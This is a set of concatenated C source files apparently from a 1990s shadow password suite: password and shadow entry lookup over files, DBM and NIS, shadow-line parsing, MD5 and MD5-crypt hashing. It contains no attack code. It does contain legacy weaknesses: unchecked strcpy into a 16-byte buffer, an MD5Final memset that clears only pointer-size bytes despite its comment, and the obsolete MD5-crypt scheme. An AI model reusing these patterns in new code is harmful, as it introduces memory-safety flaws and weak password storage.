			val->pw_gid = NISval->pw_gid;
		if (val->pw_gecos[0] == '\0')
			val->pw_gecos = NISval->pw_gecos;
		if (val->pw_dir[0] == '\0')
			val->pw_dir = NISval->pw_dir;
		if (val->pw_shell[0] == '\0')
			val->pw_shell = NISval->pw_shell;

		return val;
	} else {
		if (nis_bound == 0) {
			if (bind_nis ()) {
				nis_state = native2;
				goto again;
			}
		}
		if (nis_state == start) {
			if (yp_first (nis_domain, "passwd.byname", &nis_key,
				&nis_keylen, &nis_val, &nis_vallen)) {
				nis_state = native2;
				goto again;
			}
			nis_state = middle;
		} else if (nis_state == middle) {
			if (yp_next (nis_domain, "passwd.byname", nis_key,
				nis_keylen, &nis_key, &nis_keylen,
				&nis_val, &nis_vallen)) {
				nis_state = native2;
				goto again;
			}
		}
		return sgetpwent (nis_val);
	}
#else
	return fgetpwent (pwdfp);
#endif
}

/*
 * getpwuid - locate the password entry for a given UID
 *
 * getpwuid() locates the first password file entry for the given UID.
 * If there is a valid DBM file, the DBM files are queried first for
 * the entry.  Otherwise, a linear search is begun of the password file
 * searching for an entry which matches the provided UID.
 */

struct passwd *
getpwuid (uid)
uid_t	uid;
{
	struct	passwd	*pwd;
#if defined(DBM) || defined(NDBM)
	datum	key;
	datum	content;
	uid_t	uid_key;
#endif
#ifdef	AUTOSHADOW
	struct	spwd	*spwd;
#endif
#ifdef	USE_NIS
	char	buf[BUFSIZ];
	static	char	save_name[16];
	int	nis_disabled = 0;
#endif

	(void) setpwent ();
	if (! pwdfp)
		return 0;

#if defined(DBM) || defined(NDBM)

	/*
	 * If the DBM file are now open, create a key for this UID and
	 * try to fetch the entry from the database.  A matching record
	 * will be unpacked into a static structure and returned to
	 * the user.
	 */

	if (dbmopened) {
		uid_key = uid;
		key.dsize = sizeof uid_key;
		key.dptr = (char *) &uid_key;
#ifdef	DBM
		content = fetch (key);
#endif
#ifdef	NDBM
		content = dbm_fetch (pw_dbm, key);
#endif
		if (content.dptr != 0) {
			memcpy (pwdbuf, content.dptr, content.dsize);
			pw_unpack (pwdbuf, content.dsize, &pwent);
#ifdef	AUTOSHADOW
			if ((spwd = getspnam (pwent.pw_name))) {
				pwent.pw_passwd = spwd->sp_pwdp;
#ifdef	ATT_AGE
				pwent.pw_age = sptopwage (spwd);
#endif
			}
#endif
			return &pwent;
		}
	}
#endif
#ifdef	USE_NIS

	/*
	 * Search the passwd.byuid map for this user.
	 */

	if (! nis_ignore && ! nis_bound)
		bind_nis ();

	if (! nis_ignore && nis_bound) {
		char	*cp;

		sprintf (buf, "%d", uid);

		if (yp_match (nis_domain, "passwd.byuid", buf,
				strlen (buf), &nis_val, &nis_vallen) == 0) {

			if (cp = strchr (nis_val, '\n'))
				*cp = '\0';

			nis_state = middle;
			if ((pwd = sgetpwent (nis_val))) {
				strcpy (save_name, pwd->pw_name);
				nis_key = save_name;
				nis_keylen = strlen (save_name);
			}
			return pwd;
		} else
			nis_state = native2;
	}
#endif
#ifdef	USE_NIS
	/*
	 * NEEDSWORK -- this is a mess, and it is the same mess in the
	 * other three files.  I can't just blindly turn off NIS because
	 * this might be the first pass through the local files.  In
	 * that case, I never discover that NIS is present.
	 */

	if (nis_used) {
		nis_ignore++;
		nis_disabled++;
	}
#endif
	/*
	 * Search for an entry which matches the UID.  Return the
	 * entry when a match is found.
	 */

	while ((pwd = getpwent ()))
		if (pwd->pw_uid == uid)
			break;

#ifdef	USE_NIS
	if (nis_disabled)
		nis_ignore--;
#endif
#ifdef	AUTOSHADOW
	if (pwd && (spwd = getspnam (pwd->pw_name))) {
		pwd->pw_passwd = spwd->sp_pwdp;
#ifdef	ATT_AGE
		pwd->pw_age = sptopwage (spwd);
#endif
	}
#endif
	return pwd;
}

/*
 * getpwnam - locate the password entry for a given name
 *
 * getpwnam() locates the first password file entry for the given name.
 * If there is a valid DBM file, the DBM files are queried first for
 * the entry.  Otherwise, a linear search is begun of the password file
 * searching for an entry which matches the provided name.
 */

struct passwd *
getpwnam (name)
	const char *name;
{
	struct	passwd	*pwd;
#if defined(DBM) || defined(NDBM)
	datum	key;
	datum	content;
#endif
#ifdef	AUTOSHADOW
	struct	spwd	*spwd;
#endif
#ifdef	USE_NIS
	char	buf[BUFSIZ];
	static	char	save_name[16];
	int	nis_disabled = 0;
#endif

	(void) setpwent ();
	if (! pwdfp)
		return 0;

#if defined(DBM) || defined(NDBM)

	/*
	 * If the DBM file are now open, create a key for this UID and
	 * try to fetch the entry from the database.  A matching record
	 * will be unpacked into a static structure and returned to
	 * the user.
	 */

	if (dbmopened) {
		key.dsize = strlen (name);
		key.dptr = (void *) name;
#ifdef	DBM
		content = fetch (key);
#endif
#ifdef	NDBM
		content = dbm_fetch (pw_dbm, key);
#endif
		if (content.dptr != 0) {
			memcpy (pwdbuf, content.dptr, content.dsize);
			pw_unpack (pwdbuf, content.dsize, &pwent);
#ifdef	AUTOSHADOW
			if ((spwd = getspnam (pwent.pw_name))) {
				pwent.pw_passwd = spwd->sp_pwdp;
#ifdef	ATT_AGE
				pwent.pw_age = sptopwage (spwd);
#endif
			}
#endif
			return &pwent;
		}
	}
#endif

	/*
	 * Search for an entry which matches the name.  Return the
	 * entry when a match is found.
	 */

local:
	while ((pwd = getpwent ())) {
#ifdef	USE_NIS
		/*
		 * See if we hit a "+" symbol.  If we did, we can just
		 * query the map directly.  If that fails, we come back
		 * to next line.
		 */

		if (nis_state == middle)
			goto remote;
#endif
		if (strcmp (pwd->pw_name, name) == 0)
			break;
	}
fini:
#ifdef	AUTOSHADOW
	if (pwd && (spwd = getspnam (pwd->pw_name))) {
		pwd->pw_passwd = spwd->sp_pwdp;
#ifdef	ATT_AGE
		pwd->pw_age = sptopwage (spwd);
#endif	/* ATT_AGE */
	}
#endif	/* AUTOSHADOW */
	return pwd;

#ifdef	USE_NIS
remote:
	/*
	 * Search the passwd.byname map for this user.
	 */

	if (! nis_ignore && ! nis_bound)
		bind_nis ();

	if (! nis_ignore && nis_bound) {
		char	*cp;

		if (yp_match (nis_domain, "passwd.byname", name,
				strlen (name), &nis_val, &nis_vallen) == 0) {

			if (cp = strchr (nis_val, '\n'))
				*cp = '\0';

			nis_state = middle;
			if ((pwd = sgetpwent (nis_val))) {
				strcpy (save_name, pwd->pw_name);
				nis_key = save_name;
				nis_keylen = strlen (save_name);
			}
			goto fini;
		} else {
			nis_state = native2;
			goto local;
		}
	}
	goto fini;
#endif	/* USE_NIS */
}

/*
 * setpwent - open the password file
 *
 * setpwent() opens the system password file, and the DBM password files
 * if they are present.  The system password file is rewound if it was
 * open already.
 */

SETXXENT_TYPE
setpwent ()
{
#ifdef	NDBM
	int	mode;
#endif

#ifdef	USE_NIS
	nis_state = native;
#endif
	if (! pwdfp) {
		if (! (pwdfp = fopen (pwdfile, "r")))
			SETXXENT_RET(-1);
	} else {
		if (fseek (pwdfp, (off_t) 0L, SEEK_SET) != 0) {
			fclose (pwdfp);
			pwdfp = 0;
			SETXXENT_RET(-1);
		}
	}

	/*
	 * Attempt to open the DBM files if they have never been opened
	 * and an error has never been returned.
	 */

#if defined (DBM) || defined (NDBM)
	if (! dbmerror && ! dbmopened) {
		char	dbmfiles[BUFSIZ];

		strcpy (dbmfiles, pwdfile);
		strcat (dbmfiles, ".pag");
#ifdef	NDBM
		if (pw_dbm_mode == -1)
			mode = O_RDONLY;
		else
			mode = (pw_dbm_mode == O_RDONLY ||
				pw_dbm_mode == O_RDWR) ? pw_dbm_mode:O_RDONLY;
#endif
#ifdef	DBM
		if (access (dbmfiles, 0) || dbminit (pwdfile))
#endif
#ifdef	NDBM
		if (access (dbmfiles, 0) ||
			(! (pw_dbm = dbm_open (pwdfile, mode, 0))))
#endif
			dbmerror = 1;
		else
			dbmopened = 1;
	}
#endif
	SETXXENT_RET(0);
}

#endif /* GETPWENT */
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#ifdef SHADOWPWD	/*{*/

#include "rcsid.h"
RCSID("$Id: sgetspent.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <sys/types.h>
#include "prototypes.h"
#include "defines.h"
#include <stdio.h>

#define	FIELDS	9
#define	OFIELDS	5

/*
 * sgetspent - convert string in shadow file format to (struct spwd *)
 */

struct spwd *
sgetspent (string)
	const char *string;
{
	static char spwbuf[BUFSIZ];
	static struct spwd spwd;
	char	*fields[FIELDS];
	char	*cp;
	char	*cpp;
	int	i;

	/*
	 * Copy string to local buffer.  It has to be tokenized and we
	 * have to do that to our private copy.
	 */

	strncpy (spwbuf, string, sizeof(spwbuf) - 1);
	spwbuf[sizeof(spwbuf) - 1] = '\0';

	if ((cp = strrchr (spwbuf, '\n')))
		*cp = '\0';

	/*
	 * Tokenize the string into colon separated fields.  Allow up to
	 * FIELDS different fields.
	 */

	for (cp = spwbuf, i = 0;*cp && i < FIELDS;i++) {
		fields[i] = cp;
		while (*cp && *cp != ':')
			cp++;

		if (*cp)
			*cp++ = '\0';
	}

	/*
	 * It is acceptable for the last SVR4 field to be blank.  This
	 * results in the loop being terminated early.  In which case,
	 * we just make the last field be blank and be done with it.
	 */

	if (i == (FIELDS-1))
		fields[i++] = cp;

	if ((cp && *cp) || (i != FIELDS && i != OFIELDS))
		return 0;

	/*
	 * Start populating the structure.  The fields are all in
	 * static storage, as is the structure we pass back.
	 */

	spwd.sp_namp = fields[0];
	spwd.sp_pwdp = fields[1];

	/*
	 * Get the last changed date.  For all of the integer fields,
	 * we check for proper format.  It is an error to have an
	 * incorrectly formatted number.
	 */

	if ((spwd.sp_lstchg = strtol (fields[2], &cpp, 10)) == 0 && *cpp) {
		return 0;
	} else if (fields[2][0] == '\0')
		spwd.sp_lstchg = -1;

	/*
	 * Get the minimum period between password changes.
	 */

	if ((spwd.sp_min = strtol (fields[3], &cpp, 10)) == 0 && *cpp) {
		return 0;
	} else if (fields[3][0] == '\0')
		spwd.sp_min = -1;

	/*
	 * Get the maximum number of days a password is valid.
	 */

	if ((spwd.sp_max = strtol (fields[4], &cpp, 10)) == 0 && *cpp) {
		return 0;
	} else if (fields[4][0] == '\0')
		spwd.sp_max = -1;

	/*
	 * If there are only OFIELDS fields (this is a SVR3.2 /etc/shadow
	 * formatted file), initialize the other field members to -1.
	 */

#ifdef	SVR4
	if (i == OFIELDS)
		return 0;
#else
	if (i == OFIELDS) {
		spwd.sp_warn = spwd.sp_inact = spwd.sp_expire =
			spwd.sp_flag = -1;

		return &spwd;
	}
#endif

	/*
	 * The rest of the fields are mandatory for SVR4, but optional
	 * for anything else.  However, if one is present the others
	 * must be as well.
	 */

	/*
	 * Get the number of days of password expiry warning.
	 */

	if ((spwd.sp_warn = strtol (fields[5], &cpp, 10)) == 0 && *cpp) {
		return 0;
	} else if (fields[5][0] == '\0')
		spwd.sp_warn = -1;

	/*
	 * Get the number of days of inactivity before an account is
	 * disabled.
	 */

	if ((spwd.sp_inact = strtol (fields[6], &cpp, 10)) == 0 && *cpp) {
		return 0;
	} else if (fields[6][0] == '\0')
		spwd.sp_inact = -1;

	/*
	 * Get the number of days after the epoch before the account is
	 * set to expire.
	 */

	if ((spwd.sp_expire = strtol (fields[7], &cpp, 10)) == 0 && *cpp) {
		return 0;
	} else if (fields[7][0] == '\0')
		spwd.sp_expire = -1;

	/*
	 * This field is reserved for future use.  But it isn't supposed
	 * to have anything other than a valid integer in it.
	 */

	if ((spwd.sp_flag = strtol (fields[8], &cpp, 10)) == 0 && *cpp) {
		return 0;
	} else if (fields[8][0] == '\0')
		spwd.sp_flag = -1;

	return (&spwd);
}
#endif	/*}*/
/*
 * This code implements the MD5 message-digest algorithm.
 * The algorithm is due to Ron Rivest.  This code was
 * written by Colin Plumb in 1993, no copyright is claimed.
 * This code is in the public domain; do with it what you wish.
 *
 * Equivalent code is available from RSA Data Security, Inc.
 * This code has been tested against that, and is equivalent,
 * except that you don't need to include two pages of legalese
 * with every copy.
 *
 * To compute the message digest of a chunk of bytes, declare an
 * MD5Context structure, pass it to MD5Init, call MD5Update as
 * needed on buffers full of bytes, and then call MD5Final, which
 * will fill a supplied 16-byte array with the digest.
 */
#include <config.h>

#ifdef MD5_CRYPT
#include <string.h>		/* for memcpy() */
#include "md5.h"

#ifndef HIGHFIRST
#define byteReverse(buf, len)	/* Nothing */
#else
void byteReverse(unsigned char *buf, unsigned longs);

#ifndef ASM_MD5
/*
 * Note: this code is harmless on little-endian machines.
 */
void byteReverse(unsigned char *buf, unsigned longs)
{
    uint32 t;
    do {
	t = (uint32) ((unsigned) buf[3] << 8 | buf[2]) << 16 |
	    ((unsigned) buf[1] << 8 | buf[0]);
	*(uint32 *) buf = t;
	buf += 4;
    } while (--longs);
}
#endif
#endif

/*
 * Start MD5 accumulation.  Set bit count to 0 and buffer to mysterious
 * initialization constants.
 */
void MD5Init(struct MD5Context *ctx)
{
    ctx->buf[0] = 0x67452301;
    ctx->buf[1] = 0xefcdab89;
    ctx->buf[2] = 0x98badcfe;
    ctx->buf[3] = 0x10325476;

    ctx->bits[0] = 0;
    ctx->bits[1] = 0;
}

/*
 * Update context to reflect the concatenation of another buffer full
 * of bytes.
 */
void MD5Update(struct MD5Context *ctx, unsigned char const *buf, unsigned len)
{
    uint32 t;

    /* Update bitcount */

    t = ctx->bits[0];
    if ((ctx->bits[0] = t + ((uint32) len << 3)) < t)
	ctx->bits[1]++;		/* Carry from low to high */
    ctx->bits[1] += len >> 29;

    t = (t >> 3) & 0x3f;	/* Bytes already in shsInfo->data */

    /* Handle any leading odd-sized chunks */

    if (t) {
	unsigned char *p = (unsigned char *) ctx->in + t;

	t = 64 - t;
	if (len < t) {
	    memcpy(p, buf, len);
	    return;
	}
	memcpy(p, buf, t);
	byteReverse(ctx->in, 16);
	MD5Transform(ctx->buf, (uint32 *) ctx->in);
	buf += t;
	len -= t;
    }
    /* Process data in 64-byte chunks */

    while (len >= 64) {
	memcpy(ctx->in, buf, 64);
	byteReverse(ctx->in, 16);
	MD5Transform(ctx->buf, (uint32 *) ctx->in);
	buf += 64;
	len -= 64;
    }

    /* Handle any remaining bytes of data. */

    memcpy(ctx->in, buf, len);
}

/*
 * Final wrapup - pad to 64-byte boundary with the bit pattern 
 * 1 0* (64-bit count of bits processed, MSB-first)
 */
void MD5Final(unsigned char digest[16], struct MD5Context *ctx)
{
    unsigned count;
    unsigned char *p;

    /* Compute number of bytes mod 64 */
    count = (ctx->bits[0] >> 3) & 0x3F;

    /* Set the first char of padding to 0x80.  This is safe since there is
       always at least one byte free */
    p = ctx->in + count;
    *p++ = 0x80;

    /* Bytes of padding needed to make 64 bytes */
    count = 64 - 1 - count;

    /* Pad out to 56 mod 64 */
    if (count < 8) {
	/* Two lots of padding:  Pad the first block to 64 bytes */
	memset(p, 0, count);
	byteReverse(ctx->in, 16);
	MD5Transform(ctx->buf, (uint32 *) ctx->in);

	/* Now fill the next block with 56 bytes */
	memset(ctx->in, 0, 56);
    } else {
	/* Pad block to 56 bytes */
	memset(p, 0, count - 8);
    }
    byteReverse(ctx->in, 14);

    /* Append length in bits and transform */
    ((uint32 *) ctx->in)[14] = ctx->bits[0];
    ((uint32 *) ctx->in)[15] = ctx->bits[1];

    MD5Transform(ctx->buf, (uint32 *) ctx->in);
    byteReverse((unsigned char *) ctx->buf, 4);
    memcpy(digest, ctx->buf, 16);
    memset((char *) ctx, 0, sizeof(ctx));	/* In case it's sensitive */
}

#ifndef ASM_MD5

/* The four core functions - F1 is optimized somewhat */

/* #define F1(x, y, z) (x & y | ~x & z) */
#define F1(x, y, z) (z ^ (x & (y ^ z)))
#define F2(x, y, z) F1(z, x, y)
#define F3(x, y, z) (x ^ y ^ z)
#define F4(x, y, z) (y ^ (x | ~z))

/* This is the central step in the MD5 algorithm. */
#define MD5STEP(f, w, x, y, z, data, s) \
	( w += f(x, y, z) + data,  w = w<<s | w>>(32-s),  w += x )

/*
 * The core of the MD5 algorithm, this alters an existing MD5 hash to
 * reflect the addition of 16 longwords of new data.  MD5Update blocks
 * the data and converts bytes into longwords for this routine.
 */
void MD5Transform(uint32 buf[4], uint32 const in[16])
{
    register uint32 a, b, c, d;

    a = buf[0];
    b = buf[1];
    c = buf[2];
    d = buf[3];

    MD5STEP(F1, a, b, c, d, in[0] + 0xd76aa478, 7);
    MD5STEP(F1, d, a, b, c, in[1] + 0xe8c7b756, 12);
    MD5STEP(F1, c, d, a, b, in[2] + 0x242070db, 17);
    MD5STEP(F1, b, c, d, a, in[3] + 0xc1bdceee, 22);
    MD5STEP(F1, a, b, c, d, in[4] + 0xf57c0faf, 7);
    MD5STEP(F1, d, a, b, c, in[5] + 0x4787c62a, 12);
    MD5STEP(F1, c, d, a, b, in[6] + 0xa8304613, 17);
    MD5STEP(F1, b, c, d, a, in[7] + 0xfd469501, 22);
    MD5STEP(F1, a, b, c, d, in[8] + 0x698098d8, 7);
    MD5STEP(F1, d, a, b, c, in[9] + 0x8b44f7af, 12);
    MD5STEP(F1, c, d, a, b, in[10] + 0xffff5bb1, 17);
    MD5STEP(F1, b, c, d, a, in[11] + 0x895cd7be, 22);
    MD5STEP(F1, a, b, c, d, in[12] + 0x6b901122, 7);
    MD5STEP(F1, d, a, b, c, in[13] + 0xfd987193, 12);
    MD5STEP(F1, c, d, a, b, in[14] + 0xa679438e, 17);
    MD5STEP(F1, b, c, d, a, in[15] + 0x49b40821, 22);

    MD5STEP(F2, a, b, c, d, in[1] + 0xf61e2562, 5);
    MD5STEP(F2, d, a, b, c, in[6] + 0xc040b340, 9);
    MD5STEP(F2, c, d, a, b, in[11] + 0x265e5a51, 14);
    MD5STEP(F2, b, c, d, a, in[0] + 0xe9b6c7aa, 20);
    MD5STEP(F2, a, b, c, d, in[5] + 0xd62f105d, 5);
    MD5STEP(F2, d, a, b, c, in[10] + 0x02441453, 9);
    MD5STEP(F2, c, d, a, b, in[15] + 0xd8a1e681, 14);
    MD5STEP(F2, b, c, d, a, in[4] + 0xe7d3fbc8, 20);
    MD5STEP(F2, a, b, c, d, in[9] + 0x21e1cde6, 5);
    MD5STEP(F2, d, a, b, c, in[14] + 0xc33707d6, 9);
    MD5STEP(F2, c, d, a, b, in[3] + 0xf4d50d87, 14);
    MD5STEP(F2, b, c, d, a, in[8] + 0x455a14ed, 20);
    MD5STEP(F2, a, b, c, d, in[13] + 0xa9e3e905, 5);
    MD5STEP(F2, d, a, b, c, in[2] + 0xfcefa3f8, 9);
    MD5STEP(F2, c, d, a, b, in[7] + 0x676f02d9, 14);
    MD5STEP(F2, b, c, d, a, in[12] + 0x8d2a4c8a, 20);

    MD5STEP(F3, a, b, c, d, in[5] + 0xfffa3942, 4);
    MD5STEP(F3, d, a, b, c, in[8] + 0x8771f681, 11);
    MD5STEP(F3, c, d, a, b, in[11] + 0x6d9d6122, 16);
    MD5STEP(F3, b, c, d, a, in[14] + 0xfde5380c, 23);
    MD5STEP(F3, a, b, c, d, in[1] + 0xa4beea44, 4);
    MD5STEP(F3, d, a, b, c, in[4] + 0x4bdecfa9, 11);
    MD5STEP(F3, c, d, a, b, in[7] + 0xf6bb4b60, 16);
    MD5STEP(F3, b, c, d, a, in[10] + 0xbebfbc70, 23);
    MD5STEP(F3, a, b, c, d, in[13] + 0x289b7ec6, 4);
    MD5STEP(F3, d, a, b, c, in[0] + 0xeaa127fa, 11);
    MD5STEP(F3, c, d, a, b, in[3] + 0xd4ef3085, 16);
    MD5STEP(F3, b, c, d, a, in[6] + 0x04881d05, 23);
    MD5STEP(F3, a, b, c, d, in[9] + 0xd9d4d039, 4);
    MD5STEP(F3, d, a, b, c, in[12] + 0xe6db99e5, 11);
    MD5STEP(F3, c, d, a, b, in[15] + 0x1fa27cf8, 16);
    MD5STEP(F3, b, c, d, a, in[2] + 0xc4ac5665, 23);

    MD5STEP(F4, a, b, c, d, in[0] + 0xf4292244, 6);
    MD5STEP(F4, d, a, b, c, in[7] + 0x432aff97, 10);
    MD5STEP(F4, c, d, a, b, in[14] + 0xab9423a7, 15);
    MD5STEP(F4, b, c, d, a, in[5] + 0xfc93a039, 21);
    MD5STEP(F4, a, b, c, d, in[12] + 0x655b59c3, 6);
    MD5STEP(F4, d, a, b, c, in[3] + 0x8f0ccc92, 10);
    MD5STEP(F4, c, d, a, b, in[10] + 0xffeff47d, 15);
    MD5STEP(F4, b, c, d, a, in[1] + 0x85845dd1, 21);
    MD5STEP(F4, a, b, c, d, in[8] + 0x6fa87e4f, 6);
    MD5STEP(F4, d, a, b, c, in[15] + 0xfe2ce6e0, 10);
    MD5STEP(F4, c, d, a, b, in[6] + 0xa3014314, 15);
    MD5STEP(F4, b, c, d, a, in[13] + 0x4e0811a1, 21);
    MD5STEP(F4, a, b, c, d, in[4] + 0xf7537e82, 6);
    MD5STEP(F4, d, a, b, c, in[11] + 0xbd3af235, 10);
    MD5STEP(F4, c, d, a, b, in[2] + 0x2ad7d2bb, 15);
    MD5STEP(F4, b, c, d, a, in[9] + 0xeb86d391, 21);

    buf[0] += a;
    buf[1] += b;
    buf[2] += c;
    buf[3] += d;
}

#endif
#endif  /* MD5_CRYPT */
/*
 * ----------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (Revision 42):
 * <phk@login.dknet.dk> wrote this file.  As long as you retain this notice you
 * can do whatever you want with this stuff. If we meet some day, and you think
 * this stuff is worth it, you can buy me a beer in return.   Poul-Henning Kamp
 * ----------------------------------------------------------------------------
 */

/*
 * Ported from FreeBSD to Linux, only minimal changes.  --marekm
 */

#include <config.h>

#ifdef MD5_CRYPT

#include "rcsid.h"
RCSID("$Id: md5crypt.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <unistd.h>
/* #include <stdio.h> */
#include <string.h>
#include "md5.h"

static unsigned char itoa64[] =		/* 0 ... 63 => ascii - 64 */
	"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

static void
to64(s, v, n)
	char *s;
	unsigned long v;
	int n;
{
	while (--n >= 0) {
		*s++ = itoa64[v&0x3f];
		v >>= 6;
	}
}

/*
 * UNIX password
 *
 * Use MD5 for what it is best at...
 */

char *
md5_crypt(pw, salt)
	register const char *pw;
	register const char *salt;
{
	static char	*magic = "$1$";	/*
						 * This string is magic for
						 * this algorithm.  Having
						 * it this way, we can get
						 * get better later on
						 */
	static char     passwd[120], *p;
	static const char *sp,*ep;
	unsigned char	final[16];
	int sl,pl,i,j;
	MD5_CTX	ctx,ctx1;
	unsigned long l;

	/* Refine the Salt first */
	sp = salt;

	/* If it starts with the magic string, then skip that */
	if(!strncmp(sp,magic,strlen(magic)))
		sp += strlen(magic);

	/* It stops at the first '$', max 8 chars */
	for(ep=sp;*ep && *ep != '$' && ep < (sp+8);ep++)
		continue;

	/* get the length of the true salt */
	sl = ep - sp;

	MD5Init(&ctx);

	/* The password first, since that is what is most unknown */
	MD5Update(&ctx,pw,strlen(pw));

	/* Then our magic string */
	MD5Update(&ctx,magic,strlen(magic));

	/* Then the raw salt */
	MD5Update(&ctx,sp,sl);

	/* Then just as many characters of the MD5(pw,salt,pw) */
	MD5Init(&ctx1);
	MD5Update(&ctx1,pw,strlen(pw));
	MD5Update(&ctx1,sp,sl);
	MD5Update(&ctx1,pw,strlen(pw));
	MD5Final(final,&ctx1);
	for(pl = strlen(pw); pl > 0; pl -= 16)
		MD5Update(&ctx,final,pl>16 ? 16 : pl);

	/* Don't leave anything around in vm they could use. */
	memset(final,0,sizeof final);

	/* Then something really weird... */
	for (j=0,i = strlen(pw); i ; i >>= 1)
		if(i&1)
		    MD5Update(&ctx, final+j, 1);
		else
		    MD5Update(&ctx, pw+j, 1);

	/* Now make the output string */
	strcpy(passwd,magic);
	strncat(passwd,sp,sl);
	strcat(passwd,"$");

	MD5Final(final,&ctx);

	/*
	 * and now, just to make sure things don't run too fast
	 * On a 60 Mhz Pentium this takes 34 msec, so you would
	 * need 30 seconds to build a 1000 entry dictionary...
	 */
	for(i=0;i<1000;i++) {
		MD5Init(&ctx1);
		if(i & 1)
			MD5Update(&ctx1,pw,strlen(pw));
		else
			MD5Update(&ctx1,final,16);

		if(i % 3)
			MD5Update(&ctx1,sp,sl);

		if(i % 7)
			MD5Update(&ctx1,pw,strlen(pw));

		if(i & 1)
			MD5Update(&ctx1,final,16);
		else
			MD5Update(&ctx1,pw,strlen(pw));
		MD5Final(final,&ctx1);
	}

	p = passwd + strlen(passwd);

	l = (final[ 0]<<16) | (final[ 6]<<8) | final[12]; to64(p,l,4); p += 4;
	l = (final[ 1]<<16) | (final[ 7]<<8) | final[13]; to64(p,l,4); p += 4;
	l = (final[ 2]<<16) | (final[ 8]<<8) | final[14]; to64(p,l,4); p += 4;
	l = (final[ 3]<<16) | (final[ 9]<<8) | final[15]; to64(p,l,4); p += 4;
	l = (final[ 4]<<16) | (final[10]<<8) | final[ 5]; to64(p,l,4); p += 4;
	l =                    final[11]                ; to64(p,l,2); p += 2;
	*p = '\0';

	/* Don't leave anything around in vm they could use. */
	memset(final,0,sizeof final);

	return passwd;
}
#endif
/*
 * Copyright 1988 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *	$Id: gshadow_.h,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $
 */

#ifndef	_H_GSHADOW
#define	_H_GSHADOW

/*
 * Shadow group security file structure
 */

struct	sgrp {
	char	*sg_name;	/* group name */
	char	*sg_passwd;	/* group password */
	char	**sg_adm;	/* group administator list */
	char	**sg_mem;	/* group membership list */
};

/*
 * Shadow group security file functions.
 */

#include <stdio.h>  /* for FILE */

#if __STDC__
struct	sgrp	*getsgent (void);
struct	sgrp	*getsgnam (const char *);
struct	sgrp	*sgetsgent (const char *);
struct	sgrp	*fgetsgent (FILE *);
void	setsgent (void);
void	endsgent (void);
int	putsgent (const struct sgrp *, FILE *);
#else
struct	sgrp	*getsgent ();
struct	sgrp	*getsgnam ();
struct	sgrp	*sgetsgent ();
struct	sgrp	*fgetsgent ();
void	setsgent ();
void	endsgent ();
int	putsgent ();
#endif

#define	GSHADOW	"/etc/gshadow"
#endif /* ifndef _H_GSHADOW */
/*
 * Copyright 1988 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
